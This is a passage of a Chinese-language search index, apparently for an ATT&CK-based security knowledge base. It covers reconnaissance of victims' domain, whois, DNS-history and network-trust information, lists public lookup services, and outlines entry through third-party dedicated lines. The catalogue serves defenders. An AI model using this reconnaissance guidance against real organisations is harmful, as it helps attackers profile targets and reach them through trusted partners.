\u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662f\u4e00\u4e2a\u7528\u6765\u67e5\u8be2\u57df\u540d\u662f\u5426\u5df2\u7ecf\u88ab\u6ce8\u518c\uff0c\u4ee5\u53ca\u6ce8\u518c\u57df\u540d\u7684\u8be6\u7ec6\u4fe1\u606f\u7684\u6570\u636e\u5e93\uff08\u5982\u57df\u540d\u6240\u6709\u4eba\u3001\u57df\u540d\u6ce8\u518c\u5546\u3001\u57df\u540d\u6ce8\u518c\u65e5\u671f\u548c\u8fc7\u671f\u65e5\u671f\u3001DNS\u7b49\uff09\u3002\u901a\u8fc7\u57df\u540dWhois\u670d\u52a1\u5668\u67e5\u8be2\uff0c\u53ef\u4ee5\u67e5\u8be2\u57df\u540d\u5f52\u5c5e\u8005\u8054\u7cfb\u65b9\u5f0f\uff0c\u4ee5\u53ca\u6ce8\u518c\u548c\u5230\u671f\u65f6\u95f4\u3002 Kali\u4e0bwhois\u67e5\u8be2 \u57df\u540dWhois\u67e5\u8be2 - \u7ad9\u957f\u4e4b\u5bb6 Whois \u7231\u7ad9 ip138 Whois Lookup ICANN Lookup \u57df\u540d\u4fe1\u606f\u67e5\u8be2 - \u817e\u8baf\u4e91 nicolasbouliane \u65b0\u7f51 whois\u4fe1\u606f\u67e5\u8be2 IP WHOIS\u67e5\u8be2 - \u7ad9\u957f\u5de5\u5177 \u5fae\u6b65\u5728\u7ebf \u5947\u5b89\u4fe1\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 ...","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_7","text":"MITRE-ATT&CK-T1590-001 https://attack.mitre.org/techniques/T1590/001/ \u6536\u96c6\u57df\u540d\u4fe1\u606f.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2119907","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/","text":"T1590-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-DNS \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005DNS\u7684\u4fe1\u606f\u3002DNS\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u6ce8\u518c\u7684\u540d\u79f0\u670d\u52a1\u5668\u4ee5\u53ca\u6982\u8ff0\u76ee\u6807\u5b50\u57df\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u548c\u5176\u4ed6\u4e3b\u673a\u7684\u5730\u5740\u7684\u8bb0\u5f55\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7DNS/Passive DNS\u67e5\u8be2\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6536\u96c6\u8be6\u7ec6\u4fe1\u606f\u3002\u51ed\u8bc1\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u4e3b\u52a8\u626b\u63cf\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b dnsdb: \u5168\u7403DNS\u641c\u7d22\u5f15\u64ce viewdns.info: \u4ee4\u7ad9\u957f\u5341\u5206\u86cb\u75bc\u7684DNS\u5386\u53f2\u8bb0\u5f55\u7f51\u7ad9\uff0c\u8bb0\u5f55\u4e86\u51e0\u5e74\u5185\u7684\u66f4\u6539\u8bb0\u5f55\u3002 securitytrails.com: \u5e9e\u5927\u7684DNS\u5386\u53f2\u6570\u636e\u5e93\uff0c\u6211\u8bd5\u4e86\u4e0b\u53ef\u4ee5\u67e5\u51fa\u51e0\u5e74\u5185\u7f51\u7ad9\u7528\u8fc7\u7684IP\u3001\u673a\u623f\u4fe1\u606f\u7b49\uff0c\u975e\u5e38\u53ef\u6015\u3002 \u5728\u7ebf\u7f51\u7ad9\u67e5\u8be2 dnsdb NETCRAFT viewdns threatbook securitytrails \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1590-002 https://attack.mitre.org/techniques/T1590/002/ DNS\u5386\u53f2\u89e3\u6790.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2120650 \u6e17\u900f\u6d4b\u8bd5\u4e4b\u4fe1\u606f\u6536\u96c6DNS\u7bc7 https://blog.csdn.net/qq1124794084/article/details/78672225","title":"T1590-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-DNS"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#t1590-002-dns","text":"","title":"T1590-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-DNS"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005DNS\u7684\u4fe1\u606f\u3002DNS\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u6ce8\u518c\u7684\u540d\u79f0\u670d\u52a1\u5668\u4ee5\u53ca\u6982\u8ff0\u76ee\u6807\u5b50\u57df\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u548c\u5176\u4ed6\u4e3b\u673a\u7684\u5730\u5740\u7684\u8bb0\u5f55\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7DNS/Passive DNS\u67e5\u8be2\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6536\u96c6\u8be6\u7ec6\u4fe1\u606f\u3002\u51ed\u8bc1\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u4e3b\u52a8\u626b\u63cf\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_1","text":"dnsdb: \u5168\u7403DNS\u641c\u7d22\u5f15\u64ce viewdns.info: \u4ee4\u7ad9\u957f\u5341\u5206\u86cb\u75bc\u7684DNS\u5386\u53f2\u8bb0\u5f55\u7f51\u7ad9\uff0c\u8bb0\u5f55\u4e86\u51e0\u5e74\u5185\u7684\u66f4\u6539\u8bb0\u5f55\u3002 securitytrails.com: \u5e9e\u5927\u7684DNS\u5386\u53f2\u6570\u636e\u5e93\uff0c\u6211\u8bd5\u4e86\u4e0b\u53ef\u4ee5\u67e5\u51fa\u51e0\u5e74\u5185\u7f51\u7ad9\u7528\u8fc7\u7684IP\u3001\u673a\u623f\u4fe1\u606f\u7b49\uff0c\u975e\u5e38\u53ef\u6015\u3002 \u5728\u7ebf\u7f51\u7ad9\u67e5\u8be2 dnsdb NETCRAFT viewdns threatbook securitytrails","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_7","text":"MITRE-ATT&CK-T1590-002 https://attack.mitre.org/techniques/T1590/002/ DNS\u5386\u53f2\u89e3\u6790.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2120650 \u6e17\u900f\u6d4b\u8bd5\u4e4b\u4fe1\u606f\u6536\u96c6DNS\u7bc7 https://blog.csdn.net/qq1124794084/article/details/78672225","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/","text":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u4fe1\u4efb\u5173\u7cfb \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u4efb\u5173\u7cfb\u7684\u4fe1\u606f\u3002\u6709\u5173\u7f51\u7edc\u4fe1\u4efb\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5df2\u8fde\u63a5\uff08\u5e76\u53ef\u80fd\u63d0\u5347\u4e86\u7684\uff09\u7f51\u7edc\u8bbf\u95ee\u6743\u9650\u7684\u7b2c\u4e8c\u6216\u7b2c\u4e09\u65b9\u7ec4\u7ec7/\u57df\uff08\u4f8b\u5982\uff1a\u6258\u7ba1\u670d\u52a1\u63d0\u4f9b\u5546\uff0c\u627f\u5305\u5546\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u6536\u96c6\u3002\u6709\u5173\u7f51\u7edc\u4fe1\u4efb\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\uff0c\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4fe1\u4efb\u5173\u7cfb\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u7b80\u5355\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u6bd4\u5982\u4e00\u4e9b\u7279\u6b8a\u884c\u4e1a\uff0c\u822a\u7a7a\u3001\u91d1\u878d\u3001\u8fd0\u8425\u5546\uff0c\u548c\u5206\u516c\u53f8\u6216\u8005\u7b2c\u4e09\u65b9\u516c\u53f8\u4e4b\u95f4\u90fd\u662f\u4e13\u7ebf\uff0c\u901a\u8fc7\u653b\u51fb\u5206\u516c\u53f8\u3001\u7b2c\u4e09\u65b9\u516c\u53f8\uff0c\u83b7\u53d6\u6743\u9650\uff0c\u8d70\u4e13\u7ebf\u7f51\u7edc\u8fdb\u5165\u53d7\u5bb3\u8005\u7f51\u7edc\u5185\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1590-003 https://attack.mitre.org/techniques/T1590/003/","title":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u4fe1\u4efb\u5173\u7cfb"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#t1590-001-","text":"","title":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u4fe1\u4efb\u5173\u7cfb"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u4efb\u5173\u7cfb\u7684\u4fe1\u606f\u3002\u6709\u5173\u7f51\u7edc\u4fe1\u4efb\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5df2\u8fde\u63a5\uff08\u5e76\u53ef\u80fd\u63d0\u5347\u4e86\u7684\uff09\u7f51\u7edc\u8bbf\u95ee\u6743\u9650\u7684\u7b2c\u4e8c\u6216\u7b2c\u4e09\u65b9\u7ec4\u7ec7/\u57df\uff08\u4f8b\u5982\uff1a\u6258\u7ba1\u670d\u52a1\u63d0\u4f9b\u5546\uff0c\u627f\u5305\u5546\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u6536\u96c6\u3002\u6709\u5173\u7f51\u7edc\u4fe1\u4efb\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\uff0c\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4fe1\u4efb\u5173\u7cfb\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_1","text":"\u7b80\u5355\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u6bd4\u5982\u4e00\u4e9b\u7279\u6b8a\u884c\u4e1a\uff0c\u822a\u7a7a\u3001\u91d1\u878d\u3001\u8fd0\u8425\u5546\uff0c\u548c\u5206\u516c\u53f8\u6216\u8005\u7b2c\u4e09\u65b9\u516c\u53f8\u4e4b\u95f4\u90fd\u662f\u4e13\u7ebf\uff0c\u901a\u8fc7\u653b\u51fb\u5206\u516c\u53f8\u3001\u7b2c\u4e09\u65b9\u516c\u53f8\uff0c\u83b7\u53d6\u6743\u9650\uff0c\u8d70\u4e13\u7ebf\u7f51\u7edc\u8fdb\u5165\u53d7\u5bb3\u8005\u7f51\u7edc\u5185\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3